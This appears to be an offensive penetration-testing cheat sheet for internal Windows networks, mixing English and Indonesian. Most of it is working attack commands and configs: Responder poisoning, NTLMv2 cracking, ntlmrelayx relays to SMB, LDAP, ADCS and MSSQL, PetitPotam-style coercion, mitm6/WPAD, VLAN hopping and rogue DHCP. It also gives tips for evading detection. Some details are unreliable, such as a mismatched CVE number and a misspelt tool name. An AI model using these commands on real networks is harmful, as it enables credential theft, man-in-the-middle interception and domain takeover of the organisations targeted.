# net-internal — net

# Internal Network Attack: Name Resolution Poisoning & Layer 2

## 1. LLMNR/NBT-NS/mDNS poisoning — Responder vs bettercap

### 1.1 Basic mechanism

| Protocol | Port | Trigger on Windows 11 24H2 | Default state |
|---|---|---|---|
| LLMNR | UDP 5355 (multicast 224.0.0.252 / ff02::1:3) | Name resolution fails via DNS | ON (no default GPO to disable) |
| NBT-NS | UDP 137 (broadcast) | Resolusi nama NetBIOS, legacy app, SMB short-name | ON per adapter |
| mDNS | UDP 5353 (224.0.0.251) | Bonjour/iTunes, printer discovery, some Java apps | ON |
| WPAD (DNS) | UDP 53 query `wpad.<domain>` | Proxy auto-detect (WinHTTP/IE mode Edge) | ON kecuali `AutoDetect=0` |

What the victim sends: name resolution query to broadcast. What appears at the attacker: that query, the attacker answers with its own IP → victim starts SMB auth (NTLMv2) to attacker.

### 1.2 Responder (lgandx/Responder v3.1.3.0+)

```bash
# Analisis pasif — jangan poison dulu
sudo responder -I eth0 -A

# Mode aktif: LLMNR + NBT-NS + mDNS poison, SMB/HTTP/WPAD rogue
sudo responder -I eth0 -wrv --lm

# Hanya LLMNR + NBT-NS, disable SMB server (hindari noise)
sudo responder -I eth0 -w --disable-ess

# WPAD rogue + DNS proxy (tangkap wpad.domain.tld)
sudo responder -I eth0 -wrv --wpad --dhcp
```

Artefak output — `/usr/share/responder/logs/`:

```
[SMB] NTLMv2-SSP Client   : 10.10.20.45
[SMB] NTLMv2-SSP Username : CORP\jsmith
[SMB] NTLMv2-SSP Hash     : jsmith::CORP:1122334455667788:
    A1B2C3D4E5F60718...:0101000000000000C0653150DE09D201...
```

Hash format: `user::domain:server_challenge:NTProofStr:blob`. Crack with hashcat:

```bash
hashcat -m 5600 ntlmv2.txt rockyou.txt -r rules/best64.rule -O -w 4
# -m 5600 = NetNTLMv2 ; ~RTX 4090: ~3-5 MH/s mode 5600
```

Credentials produced: **NTLMv2 challenge/response**, not plaintext password. Crackable → plaintext password. Not crackable → **relay or pass-the-hash only if NetNTLMv1**.

### 1.3 bettercap (v2.32.0)

```bash
sudo bettercap -iface eth0
# dalam sesi:
set net.sniff.verbose true
set arp.spoof.targets 10.10.20.0/24
net.probe on
net.sniff on

# LLMNR/mDNS/DHCPv6 + WPAD poisoning
set llmnr.spoof on
set mdns.spoof on
set dhcp6.spoof on
set http.proxy.sslstrip true
arp.spoof on

# NTLM capture via sniffer
set net.sniff.regexp '.*NTLM.*'
```

Key operational differences:

| Aspect | Responder | bettercap |
|---|---|---|
| Fokus | Name resolution poisoning murni | Framework MITM lengkap (ARP, DHCPv6, HTTP) |
| ARP spoof | No | Yes (`arp.spoof`) — can capture NTLM via SMB without LLMNR |
| WPAD | `--wpad` (DNS proxy) | `dhcp6.spoof` + `http.proxy` |
| Log | Per-service file in `logs/` | Console + `net.sniff.output` |
| Detectability | Fast (broadcast answers) | Also fast, but ARP is "noisier" in NDR |

**Why it works:** query to multicast/broadcast, all hosts in segment can answer. **Why it fails:** hosts in isolated segment (client isolation WiFi VLAN), LLMNR disabled via GPO (`Turn off multicast name resolution = Enabled`), or victim already has cache/another responder is faster.

---

## 2. NTLMv2 capture → crack vs relay decision tree

```
[ NTLMv2 captured ]
        │
        ├─ Hash crackable dalam budget? (rockyou + rule, atau wordlist org)
        │       ├─ Ya  → crack → plaintext → lateral (SMB/WinRM/RDP)
        │       └─ Tidak → lanjut ▼
        │
        ├─ SMB signing di target = required?  (nmap --script smb2-security-mode)
        │       ├─ Required (DC default, Windows Server 2022+) → RELAY GAGAL ke SMB
        │       └─ Not required → RELAY SMB ke target
        │
        ├─ LDAP signing / channel binding di DC?
        │       ├─ LDAP signing = Required (default DC modern) → relay LDAP gagal
        │       └─ Not required → relay LDAP → buat computer account / RBCD / shadow creds
        │
        ├─ Victim = machine account? (COMPUTER$) → relay → ADCS ESC8 / RBCD
        │
        └─ Coba relay ke service lain:
              HTTP (Exchange, ADCS Web Enrollment ESC8) — tanpa signing
              MSSQL — tanpa signing, EXEC xp_cmdshell
              RPC — Endpoint Mapper, Petitoam
```

Rule of thumb:

| Target | Signing default | Relay feasible |
|---|---|---|
| SMB to Windows Server 2019+ (non-DC) | Not required (requires GPO) | **Yes** |
| SMB to DC (Server 2022) | Required | **No** (unless disabled) |
| LDAP to DC | Signing required since 2019 hardening | **No** (unless `LdapEnforceChannelBinding=0` + signing off) |
| HTTP/ADCS ESC8 | N/A (HTTP) | **Ya** — target utama |
| MSSQL 2019 | Extended protection off by default | **Ya** |
| RDP | NLA required | **No** (unless NLA off) |

### 2.1 Relay with ntlmrelayx (impacket v0.12.0)

```bash
# Relay ke SMB, dump SAM jika victim admin
impacket-ntlmrelayx -tf targets.txt -smb2support -socks -of hashes.txt

# Relay ke ADCS ESC8 (HTTP) — domain join via cert
impacket-ntlmrelayx -t http://ca01.corp.local/certsrv/certfnsh.asp \
    -smb2support --adcs --template DomainController

# Relay ke LDAP — RBCD
impacket-ntlmrelayx -t ldap://dc01.corp.local --delegate-access --escalate-user attacker$

# Relay ke MSSQL — exec
impacket-ntlmrelayx -t mssql://sql01.corp.local -q "EXEC xp_cmdshell 'whoami'"

# Trigger victim: Responder dengan SMB/HTTP off (biar relay yg jawab)
sudo responder -I eth0 -wrv --disable-smb --disable-http
```

Credentials produced from relay:
- SMB relay admin → **SAM dump** (local hash) → pass-the-hash lateral
- ADCS ESC8 → **Base64 PFX certificate** → `certipy auth -pfx cert.pfx -dc-ip <DC>` → **TGT + NT hash** domain
- RBCD → **ST for computer account** → S4U2Self/S4U2Proxy → admin service

### 2.2 Coercion (trigger auth without LLMNR)

If segment is clean of LLMNR, force victim auth:

```bash
# PetitPotam ke DC
python3 PetitPotam.py -d corp.local -u user -p pass attacker_ip dc01.corp.local

# Coercer — multiple protocol
coercer coerce -l attacker_ip -t 10.10.20.10 -u user -p pass -d corp.local

# PrinterBug / SpoolSample
python3 printerbug.py corp.local/user:pass@dc01.corp.local attacker_ip
```

---

## 3. mitm6 + WPAD

### 3.1 Mekanisme

mitm6 (fox-it, v0.2.1) answers **DHCPv6** (stateless) to Windows. Windows 11 24H2 default `DHCPv6` client = ON. Attacker becomes DNS server via DHCPv6, then answers query `wpad.corp.local` with attacker IP → victim fetches `wpad.dat` → proxy → **NTLM auth to attacker**.

```
[ DHCPv6 Solicit ] → mitm6 reply Offer (DNS = attacker, no IA_NA)
[ DNS query wpad.corp.local ] → mitm6 jawab attacker IP
[ HTTP GET /wpad.dat ] → proxy auth NTLM → capture / relay
```

Why it works: IPv6 default enabled in Windows, DHCPv6 requires no auth, WPAD auto-detect default ON (`WinHttpAutoProxySvc`). Why it fails: `IPv6 disabled` via GPO, `Wpad=0` via registry (`HKLM\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings\Wpad\WpadOverride=1`), or switch with RA-guard + DHCPv6 snooping.

### 3.2 Eksekusi

```bash
sudo mitm6 -d corp.local -i eth0 --ignore-nofqdn

# Paralel — relay LDAP ke DC
impacket-ntlmrelayx -6 -t ldaps://dc01.corp.local -wh wpad.corp.local \
    --add-computer ATTACKER01 -smb2support

# Atau relay ke ADCS ESC8
impacket-ntlmrelayx -6 -t http://ca01.corp.local/certsrv/certfnsh.asp \
    -wh wpad.corp.local --adcs --template Machine -smb2support
```

After `--add-computer` succeeds: **computer account `ATTACKER01$`** with random password returned in output. Use for RBCD or resource-based constraint.

Credentials produced:
- **NTLMv2 from user** (if user performs auth to WPAD) → crack / relay
- **New computer account** (via LDAP relay `--add-computer`) → password in output → fake domain join → RBCD
- **PFX cert** (via ADCS ESC8) → domain admin TGT

---

## 4. WS-Discovery / Printer relay (CVE-2023-32233 ecosystem)

### 4.1 Mekanisme

Windows 10/11, Server 2019+ with **WSD (Web Services on Devices)** active — `Function Discovery Provider Host (fdPHost)` + `Function Discovery Resource Publication (FDResPub)` — answers WS-Discovery probes (`soap.udp` port 3702). Attacker can also **send** fake probes / spoof response, then victim performs auth to attacker.

Classic target: MFP printers (HP, Xerox, Konica) that have Windows drivers → often no SMB signing → relay.

```
[ Victim ] --WS-Discovery probe--> [ multicast 239.255.255.250:3702 ]
[ Attacker ] --spoof ProbeMatch--> [ Victim ]
[ Victim ] --SOAP / auth NTLM--> [ Attacker HTTP 5357 → relay ]
```

Alat:

```bash
# WSD discovery & spoof
python3 wsdd.py -i eth0 --spoof

# lebih umum: Responder mode khusus
sudo responder -I eth0 -wv --wpad --lm   # none dedicated, tapi HTTP/5357 akan terekam

# Coercion via printerbug ke spooler (bukan WSD, tapi co-target)
python3 printerbug.py corp.local/user:pass@fileserver.corp.local attacker_ip
```

Relay result:

```bash
impacket-ntlmrelayx -tf printer_targets.txt -smb2support -socks
# printer target default: SMB signing tidak required (firmware MFP)
```

Credentials produced: **NTLMv2 machine account** (if the one authenticating is SYSTEM/service) or user → relay to SMB printer / file server → often **SYSTEM on MFP** → pivot via driver loading.

Why it fails in the field: modern MFPs (HP FutureSmart 5, Xerox AltaLink) patch default signing, port 3702 blocked in printer VLAN, WSD disabled via GPO `Computer Configuration > Administrative Templates > Network > Link-Layer Topology Discovery`.

---

## 5. VLAN hopping

### 5.1 Double tagging (802.1Q-in-802.1Q)

Requirement: attacker port must be **native VLAN trunk** (or attacker can send tagged frames on native). Switch has no `vlantag` option to re-tag → outer tag is stripped, inner tag becomes target VLAN.

```bash
# Payload: 802.1Q outer (native, misal 1) + 802.1Q inner (target, misal 100)
sudo scapy
>>> pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/Dot1Q(vlan=1)/Dot1Q(vlan=100)/IP(dst="10.10.100.1")/ICMP()
>>> sendp(pkt, iface="eth0")
```

Reality: only **one-way** (reply cannot return to attacker without trunk), rarely works on modern Cisco IOS-XE with `vlan dot1q tag native` enabled. Historical method, but still exists on unmanaged / misconfigured switches.

### 5.2 DTP (Dynamic Trunking Protocol) — switch spoofing

If port is not explicitly `switchport mode access` and `switchport nonegotiate` is off → attacker can negotiate trunk.

```bash
sudo yersinia -I   # pilih DTP, mode "enabling trunking"

# Atau manual dengan scapy
>>> sendp(Ether(dst="01:00:0c:cc:cc:cc")/LLC()/SNAP()/DTP(tlvlist=[DTPDomain(),DTPStatus(statusType='1')]), iface="eth0")
```

If successful: attacker gets trunk, sees all VLANs:

```bash
sudo ip link add link eth0 name eth0.100 type vlan id 100
sudo ip addr add 10.10.100.50/24 dev eth0.100
sudo ip link set eth0.100 up
```

Credentials produced: depends on VLAN obtained — usually **NTLMv2** from target segment via Responder on sub-interface.

Why it fails: default Cisco `switchport mode access` + `nonegotiate`, or port-security. Cisco Nexus & 802.1X auto.

### 5.3 Rogue DHCP (DHCP starvation + rogue server)

```bash
# Starve DHCP pool
sudo yersinia -I   # DHCP → "sending DISCOVER packet" flood

# Rogue DHCP
sudo dhcpd -cf /etc/dhcp/rogue.conf -pf /run/rogue.pid eth0
```

`rogue.conf`:

```
subnet 10.10.20.0 netmask 255.255.255.0 {
    range 10.10.20.200 10.10.20.250;
    option routers 10.10.20.66;          # attacker
    option domain-name-servers 10.10.20.66;
    option domain-name "corp.local";
    option wpad-url "http://10.10.20.66/wpad.dat";
}
```

What is produced: victim (Windows 11/10 lease renew) takes attacker gateway/DNS/WPAD → **NTLMv2 via WPAD proxy auth** or HTTP relay. If attacker also becomes gateway → **full MITM** for internal SMB/HTTP.

Why it fails: **DHCP snooping** (Cisco default on access), port-security, or `ip dhcp snooping trust` only on uplink. Also Windows lease does not renew quickly — need to wait for T1 (50% lease) or force victim release.

---

## 6. Matriks artefak kredensial

| Attack | Artifact | Format | Crack? | Direct reuse? |
|---|---|---|---|---|
| Responder LLMNR | NTLMv2 (user) | hashcat 5600 | Yes (~MH/s 4090) | Relay only |
| Responder NBT-NS | NTLMv2 (user) | 5600 | Ya | Relay |
| Responder mDNS | NTLMv2 (user) | 5600 | Ya | Relay |
| Responder WPAD | NTLMv2 (user) | 5600 | Ya | Relay |
| Relayed SMB (local admin) | SAM hash (NT) | hashcat 1000 | Practically no | Pass-the-hash |
| Relayed LDAP `--add-computer` | Computer password | plaintext | — | RBCD / join |
| Relayed LDAP `--delegate-access` | RBCD ST | kirbi | — | S4U2Proxy |
| ADCS ESC8 relay | PFX cert | base64 | — | `certipy auth` → TGT + NT |
| mitm6 + LDAP | Computer acct + NTLMv2 | mix | — | RBCD / relay |
| WSD printer relay | Machine NTLMv2 | 5600 | Sulit | Relay SMB (printer) |
| Rogue DHCP | NTLMv2 via WPAD | 5600 | Ya | Relay HTTP |

---

## 7. Operational pitfalls (that make this technique fail in the field)

1. **Responder runs but hash is empty** — check `tcpdump -i eth0 udp port 5355 or udp port 137`. Often: switch client isolation, or host on enterprise WiFi VLAN (peer isolation). Move segments.
2. **LLMNR disabled via GPO** (`Turn off multicast name resolution`) — in modern enterprises this is standard. Responder goes silent. **Fallback:** coercion (PetitPotam, PrinterBug, Coercer) → relay. Don't waste time waiting for LLMNR.
3. **SMB signing required to DC** — `ntlmrelayx` output `Authenticating against smb://dc01 as CORP\user FAILED — signing required`. Not a bug, not a wrong target. Move to ADCS ESC8 (HTTP) or LDAP (if signing is off).
4. **LDAP signing + channel binding = required** (default DC Server 2019+ patch) — LDAP relay fails. Unless the target has `LdapEnforceChannelBinding=0`. Check first with anonymous ldapsearch or `certipy find -vulnerable`.
5. **mitm6 doesn't get DHCPv6 reply** — RA-guard on switch. Check `tcpdump -i eth0 ip6`. If RA-guard is active → stop mitm6, switch to WPAD via DNS poisoning on another VLAN, or abort.
6. **WPAD `.dat` not fetched** — many Windows 11 24H2 have `WinHttpAutoProxySvc` set to manual / disabled via MDM (Intune baseline). `AutoDetect` in Edge can also be off. Check the victim browser UA in the Responder log — if HTTP 200 but no auth, the victim fetched but didn't auth (anonymous proxy).
7. **NTLMv2 hash doesn't crack** — doesn't mean it's dead. Check whether `--lm` (downgrade to NetNTLMv1) can be triggered — requires responder `--lm`, and policy `LmCompatibilityLevel<3` on the victim. Windows 11 24H2 default `LmCompatibilityLevel=5` → **cannot downgrade**. NetNTLMv1 only if legacy/registry modified.
8. **Relay auths successfully but doesn't execute** — `ntlmrelayx` to a non-admin SMB target: only `STATUS_ACCESS_DENIED`. Requires the victim to be a local admin on the target, OR relay to another service (LDAP/ADCS/MSSQL) where the user has sufficient privilege.
9. **ADCS ESC8 relay fails** — CA uses HTTPS + EPA (Extended Protection for Authentication) hardcoded (`ExtendedProtection=Require`) on Server 2022. Check `certipy find -vulnerable`. The certsrv HTTP endpoint defaults to `https://` in modern setups. Can still work if `certsrv` HTTP is enabled + EPA off.
10. **VLAN double tagging gets no reply** — it's one-way indeed, no reply. To get a reply you need a direct **trunk port**, not double tagging. Reality: double tagging is only useful for spoofing the source in the target VLAN, not pivoting.
11. **DTP trunk doesn't form** — port is already `switchport mode access` + `spanning-tree portfast` — Cisco default on access. Check `show interfaces switchport` on the switch (if you have access) or check whether LLDP/CDP is visible (indicates access port, not trunk).
12. **Rogue DHCP not used** — victim Windows lease hasn't expired (default 8 days in domain, 1 day at home). Force it with DHCP starvation or send a spoofed DHCP NAK. If **DHCP snooping** is active, rogue DHCP is silently dropped — check with `tcpdump` on the victim side (if possible), or monitor whether `wpad.dat` is requested.
13. **Hashcat mode 5600 too slow for org policy** — 12+ complex passwords. Not a failed technique, but wrong cracking expectations. Redirect to the faster **decision tree relay**: relay to ADCS/LDAP, not crack.
14. **Responder + ntlmrelayx conflict** — both grab ports 445/80. Always run Responder with `--disable-smb --disable-http` when using ntlmrelayx, and confirm `impacket` binds to 445/80.
15. **NDR/EDR noise** — Responder multicast replies from a single host = "Responder" signature. Detection (Zeek, Suricata, Defender for Identity) flags it quickly. For engagements that need stealth: trigger **one-shot** coercion (PrinterBug) to just one host, not a long-running Responder.

---

## [reasoning trace]


